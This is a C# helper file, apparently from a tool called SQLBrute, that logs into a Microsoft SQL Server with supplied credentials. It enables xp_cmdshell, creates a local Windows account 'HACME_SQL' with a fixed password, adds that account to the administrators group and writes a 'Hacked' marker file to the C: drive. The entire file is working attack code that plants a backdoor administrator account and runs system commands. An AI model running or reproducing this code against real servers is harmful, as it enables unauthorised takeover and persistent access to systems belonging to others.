using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SQLBrute
{
    class Helpers
    {
        static public bool ConnectToSQL(string server, string userName, string password)
        {
            string connectionString = null;
            Object returnValue;
            SqlConnection cnn;
            SqlCommand cmd = new SqlCommand();

            connectionString = "Data Source='" + server + "';User ID='" + userName + "';Password='" + password + "'";
            cnn = new SqlConnection(connectionString);
            try
            {
                cnn.Open();
                cmd.CommandText = "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell', 1;RECONFIGURE;";
                cmd.CommandType = CommandType.Text;
                cmd.Connection = cnn;
                returnValue = cmd.ExecuteScalar();

                cmd.CommandText = "RECONFIGURE;";
                cmd.CommandType = CommandType.Text;
                cmd.Connection = cnn;
                returnValue = cmd.ExecuteScalar();

                cmd.CommandText = "xp_cmdshell 'net user HACME_SQL Password1 /ADD'";
                cmd.CommandType = CommandType.Text;
                cmd.Connection = cnn;
                returnValue = cmd.ExecuteScalar();

                cmd.CommandText = "xp_cmdshell 'net localgroup administrators HACME_SQL /ADD'";
                cmd.CommandType = CommandType.Text;
                cmd.Connection = cnn;
                returnValue = cmd.ExecuteScalar();

                cmd.CommandText = @"xp_cmdshell 'echo HACME!!! > C:\Hacked.txt'";
                cmd.CommandType = CommandType.Text;
                cmd.Connection = cnn;
                returnValue = cmd.ExecuteScalar();

                cnn.Close();
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}